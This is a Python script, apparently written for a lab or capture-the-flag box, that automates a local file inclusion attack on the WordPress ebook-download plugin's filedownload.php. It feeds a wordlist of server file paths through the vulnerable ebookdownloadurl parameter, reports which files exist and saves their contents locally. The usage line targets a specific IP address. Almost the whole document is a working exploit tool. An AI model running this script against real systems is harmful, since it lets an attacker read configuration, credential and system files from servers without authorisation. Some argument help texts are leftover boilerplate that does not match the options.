import string
import sys
import argparse
import requests
import urllib

#  python3 LFI.py -w wordlist_lfi_linux.txt -u 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=' -o output/

def open_wordlist(wordlist_path):
    try:
        file = open(wordlist_path)
        lines = file.readlines()
        print(f'Loaded {len(lines)} elements!')
    except OSError as err:
        exit('OS error: {0}'.format(err))
    except BaseException as err:
        exit(f'Unexpected {err=}, {type(err)=}') 
    finally:
        file.close()
    return lines

def parse_args():
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('-u', '--url', dest='url', required=True,
                        help='vunerable url, example: http://ex4mple.com/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=')
    parser.add_argument('-w', '--wordlist', dest='wordlist_path', required=True,
                        help='sum the integers (default: find the max)')
    parser.add_argument('-o', '--output', dest='output_path', required=False,
                        help='output path', const=None, nargs='?')
    args = parser.parse_args()
    return args.url, args.wordlist_path, args.output_path

def get_file(url, payload):
    payload_request = url + payload.replace(" ", "%20")
    with urllib.request.urlopen(payload_request) as url:
        document = url.read().decode('UTF-8')
        document_lenght = document.count('\n')
        if not document_lenght:
            print(f'{payload.rstrip()} not existing.')
            return None
        else:
            print(f'Found {payload.rstrip()}!')
            return document

def create_file(document, output_path, payload):
    if not output_path[-1] == '/':
        output_path += '/'
    
    file_name = output_path + payload.split("/")[-1]
    print (f'Creating {file_name}')
    f = open(file_name, "a")
    f.write(document)
    f.close()

def main():
    url, wordlist_path, output_path = parse_args()
    wordlist = open_wordlist(wordlist_path)
    print('Starting !')
    for index, payload in enumerate(wordlist):
        print(f'\nProcessing {index}/{len(wordlist)}')
        document = get_file(url, payload)
        if output_path and document:
            create_file(document, output_path, payload)
    print('\nFinished!')

if __name__ == '__main__':
    print('''
    __    __________             
   / /   / ____/  _/ ____  __  __
  / /   / /_   / /  / __ \/ / / /
 / /___/ __/ _/ /_ / /_/ / /_/ / 
/_____/_/   /___(_) .___/\__, /  
                 /_/    /____/   
    ''')
    sys.exit(main())